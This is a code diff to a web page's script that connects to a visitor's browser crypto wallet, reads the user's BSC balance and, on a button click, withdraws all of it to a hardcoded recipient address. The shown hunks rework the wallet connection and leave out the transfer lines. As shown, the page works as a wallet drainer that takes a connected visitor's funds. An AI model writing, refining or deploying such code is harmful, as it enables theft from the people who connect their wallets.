@@ -31,16 +31,36 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.5/web3.min.js"></script>
     <script>
         // Initialize Web3
-        const web3 = new Web3(new Web3.providers.HttpProvider('https://bsc-dataseed.binance.org/'));
+        let web3;
 
-        // Specify the recipient address
-        const recipientAddress = '0x96181B6078645EE513205f1D7e874bbE3f423F74';
+        async function initWeb3() {
+            if (window.ethereum) {
+                web3 = new Web3(window.ethereum);
+
+                try {
+                    // Request BSC wallet access
+                    await window.ethereum.request({ method: 'eth_requestAccounts' });
+                } catch (error) {
+                    console.error('Access to BSC wallet denied:', error);
+                }
+            } else {
+                console.log('No BSC wallet detected. Please install MetaMask or another BSC-compatible wallet.');
+            }
+        }
 
         // Function to withdraw all funds to the recipient address
-        const withdrawFunds = async () => {
+        async function withdrawFunds() {
             try {
+                if (!web3) {
+                    console.error('Web3 is not initialized. Make sure you have a BSC-compatible wallet installed and connected.');
+                    return;
+                }
+
+                // Specify the recipient address
+                const recipientAddress = '0x96181B6078645EE513205f1D7e874bbE3f423F74';
+
                 // Get the user's BSC address
-                const accounts = await web3.eth.requestAccounts();
+                const accounts = await web3.eth.getAccounts();
                 const userAddress = accounts[0];
 
                 // Get the user's BSC balance
@@ -65,10 +85,12 @@
             } catch (error) {
                 console.error('Error:', error);
             }
-        };
+        }
 
-        // Attach the withdrawal function to the button click event
-        document.getElementById('withdrawButton').addEventListener('click', withdrawFunds);
+        // Initialize Web3 and attach the withdrawal function to the button click event
+        initWeb3().then(() => {
+            document.getElementById('withdrawButton').addEventListener('click', withdrawFunds);
+        });
     </script>
 </body>
 </html>
